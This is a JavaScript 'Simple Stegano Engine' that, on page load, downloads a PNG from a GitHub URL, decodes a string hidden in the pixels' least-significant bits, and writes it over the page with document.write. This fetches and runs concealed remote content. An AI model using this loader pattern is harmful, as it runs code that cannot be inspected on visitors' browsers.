/*Simple Stegano Engine | Made by: https://github.com/BryanApolonio*/
/*Core Logic for LSB - Simple Stegano Engine*/

const fragmentFiles = [
    'https://raw.githubusercontent.com/BryanApolonio/BryanApolonio/main/banner.png'
];

const statusText = document.getElementById('status_text');
const progressBar = document.getElementById('bar');
const bufferCanvas = document.getElementById('buffer');
const ctx = bufferCanvas.getContext('2d');

/*
* Pure LSB Extraction
*/
async function extractBits(url) {
    return new Promise((resolve, reject) => {
        const img = new Image();
        img.crossOrigin = "Anonymous"; 
        img.src = url;

        img.onload = function() {
            bufferCanvas.width = img.width;
            bufferCanvas.height = img.height;
            ctx.drawImage(img, 0, 0);

            const imageData = ctx.getImageData(0, 0, bufferCanvas.width, bufferCanvas.height).data;
            let bits = "";

            for (let i = 0; i < imageData.length; i++) {
                if ((i + 1) % 4 === 0) continue; // Pula Alpha
                bits += (imageData[i] & 1);
            }

            let payload = "";
            for (let i = 0; i < bits.length; i += 8) {
                let byte = bits.slice(i, i + 8);
                if (byte.length < 8) break;
                let charCode = parseInt(byte, 2);
                if (charCode === 0) break; 
                payload += String.fromCharCode(charCode);
            }
            resolve(payload);
        };
        img.onerror = () => reject(`IO_ERROR: ${url}`);
    });
}

/*
* System Reconstructor
*/
async function bootSystem() {
    try {
        let rawFinalCode = ""; 

        for (let i = 0; i < fragmentFiles.length; i++) {
            const file = fragmentFiles[i];
            
            const partialContent = await extractBits(file);
            rawFinalCode += partialContent;
        }

        document.open("text/html", "replace");
        
        document.write(rawFinalCode);
        
        document.close();

    } catch (err) {

        console.error("Error:", err);
    }
}

window.onload = bootSystem;
